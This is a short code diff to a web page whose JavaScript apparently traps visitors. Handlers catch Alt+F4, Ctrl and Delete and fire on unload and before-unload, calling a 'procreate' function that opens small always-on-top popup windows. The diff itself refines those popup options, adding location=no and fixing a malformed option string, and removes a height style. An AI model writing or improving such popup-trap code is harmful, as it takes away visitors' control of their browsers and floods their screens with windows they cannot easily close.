@@ -21,7 +21,7 @@ function delkey() { if (event.keyCode == 46) procreate(); }
 		var flagRun = 1;
 
 function openWindow(url){
-        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
+        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=no,width=180,height=175,titlebar=no,location=no,alwaysRaised=yes');
 }
 
 function procreate(){
@@ -79,7 +79,7 @@ function closingCode(){
 }
 </script>
 </head>
-<body bgColor=#ffffff onload="flagRun=1;playBall();return true;bookmark();" onKeyDown="altf4key();ctrlkey();delkey();" onUnLoad="procreate()" onBeforeUnload="procreate()" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" style="height: 100vh;">
+<body bgColor=#ffffff onload="flagRun=1;playBall();return true;bookmark();" onKeyDown="altf4key();ctrlkey();delkey();" onUnLoad="procreate()" onBeforeUnload="procreate()" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
 <center>
 <div id="container" style="background-color: #ffffff;"></div>
 </center>
